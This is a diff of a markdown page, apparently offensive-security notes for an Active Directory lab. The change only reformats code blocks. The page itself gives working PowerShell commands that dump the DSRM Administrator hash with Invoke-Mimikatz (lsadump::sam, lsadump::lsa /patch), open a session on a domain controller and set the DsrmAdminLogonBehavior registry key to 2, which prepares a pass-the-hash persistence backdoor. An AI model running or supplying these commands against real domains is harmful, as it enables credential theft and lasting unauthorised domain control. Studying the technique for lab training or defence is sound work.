@@ -12,9 +12,10 @@ Every Domain controller has local administrator account called "Administrator" a
 Require Domain Admin privileges
 {% endhint %}
 
-<pre class="language-powershell"><code class="lang-powershell"><strong># dumping from sam - DSRM local Administrator hash
-</strong><strong>Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' 
-</strong></code></pre>
+```powershell
+# dumping from sam - DSRM local Administrator hash
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' 
+```
 
 ```powershell
 # dumping from lsass - Administrator hash
@@ -27,10 +28,11 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 
 In order to use DSRM account hash we need to change his registry key
 
-<pre class="language-powershell"><code class="lang-powershell"><strong># Entering DC session
-</strong><strong>Enter-PSSession -ComputerName dcorp-dc
-</strong><strong>
-</strong># Check if key exists
+```powershell
+# Entering DC session
+Enter-PSSession -ComputerName dcorp-dc
+
+# Check if key exists
 Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehavior'
 
 # If exists set his value to 2
@@ -38,9 +40,7 @@ Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminL
 
 # If does not exist create it and set his value to 2
 New-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehavior' -Value 2 -PropertyType DWORD -Verbose
-</code></pre>
-
-
+```
 
 ## Passing the hash
 
